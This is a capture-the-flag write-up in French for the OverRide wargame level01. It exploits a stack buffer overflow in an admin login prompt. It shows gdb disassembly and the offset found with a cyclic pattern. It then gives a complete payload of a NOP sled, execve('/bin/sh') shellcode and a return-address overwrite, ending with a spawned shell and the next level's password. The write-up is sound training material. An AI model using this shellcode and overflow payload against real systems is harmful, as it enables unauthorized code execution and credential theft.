# Level 01

Le programme demande d'entrer un nom d'utilisateur et un mot de passe (cf source).

Nous allons pouvoir ecrire dans la memoire car aucune verification de longueur de chaine est faite.

En effet, le nom d'utilisateur verifie la correspondance avec "dat_wil" seulement, mais nous pouvons ecrire davantage, et nous allons coller un nopsled + shellcode.

Ensuite lors du deuxieme prompt, nous pouvons ecraser l'adresse de retour, et pointer vers le buffer du 1er prompt.

Trouvons l'adresse sur gdb.
```
(gdb) disas main
Dump of assembler code for function main:
   0x080484d0 <+0>:     push   %ebp
   0x080484d1 <+1>:     mov    %esp,%ebp
   0x080484d3 <+3>:     push   %edi
   0x080484d4 <+4>:     push   %ebx
   0x080484d5 <+5>:     and    $0xfffffff0,%esp
   0x080484d8 <+8>:     sub    $0x60,%esp
   0x080484db <+11>:    lea    0x1c(%esp),%ebx
   0x080484df <+15>:    mov    $0x0,%eax
   0x080484e4 <+20>:    mov    $0x10,%edx
   0x080484e9 <+25>:    mov    %ebx,%edi
   0x080484eb <+27>:    mov    %edx,%ecx
   0x080484ed <+29>:    rep stos %eax,%es:(%edi)
   0x080484ef <+31>:    movl   $0x0,0x5c(%esp)
   0x080484f7 <+39>:    movl   $0x80486b8,(%esp)
   0x080484fe <+46>:    call   0x8048380 <puts@plt>
   0x08048503 <+51>:    mov    $0x80486df,%eax
   0x08048508 <+56>:    mov    %eax,(%esp)
   0x0804850b <+59>:    call   0x8048360 <printf@plt>
   0x08048510 <+64>:    mov    0x804a020,%eax
   0x08048515 <+69>:    mov    %eax,0x8(%esp)
   0x08048519 <+73>:    movl   $0x100,0x4(%esp)
   0x08048521 <+81>:    movl   $0x804a040,(%esp) <=== adresse du 1er buffer sur la pile.
   0x08048528 <+88>:    call   0x8048370 <fgets@plt>
   0x0804852d <+93>:    call   0x8048464 <verify_user_name>
   0x08048532 <+98>:    mov    %eax,0x5c(%esp)
   0x08048536 <+102>:   cmpl   $0x0,0x5c(%esp)
   0x0804853b <+107>:   je     0x8048550 <main+128>
```

Afin de trouver l'offset pour le ecrasement du pointeur de retour, j'utilise un string pattern.

```
(gdb) run
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

55555555 correspond a UUUU

Donc l'offset est de 84 - 4.

L'adresse de redirection sera : "\x60\xa0\x04\x08" pour sauter dans le nopsled.

Nous pouvons creer notre payload.

```
level01@OverRide:~$ python -c 'print("dat_wil" + "\x90" * 30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\n" + "A" * 80 + "\x60\xa0\x04\x08")' > /tmp/payload.txt
level01@OverRide:~$ cat /tmp/payload.txt - | /home/users/level01/level01

********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
